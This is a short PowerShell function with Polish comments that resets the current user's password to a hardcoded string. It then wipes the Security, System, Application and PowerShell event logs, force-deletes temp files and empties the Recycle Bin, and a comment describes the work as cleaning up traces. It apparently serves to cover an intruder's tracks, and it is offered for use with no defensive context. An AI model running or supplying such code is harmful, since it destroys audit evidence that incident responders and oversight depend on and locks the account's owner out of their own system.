function Invoke-Cleanup {
   # Bezpieczna zmiana hasła
$newPassword = ConvertTo-SecureString "Z@bezpieczneHaslo123!" -AsPlainText -Force
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
Set-LocalUser -Name $user -Password $newPassword

# Czyszczenie dzienników
$logTypes = @('Application', 'Security', 'System', 'Windows PowerShell')
foreach ($log in $logTypes) {
    wevtutil cl $log
}

# Czyszczenie innych śladów
Remove-Item -Path "$env:TEMP\*" -Recurse -Force
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
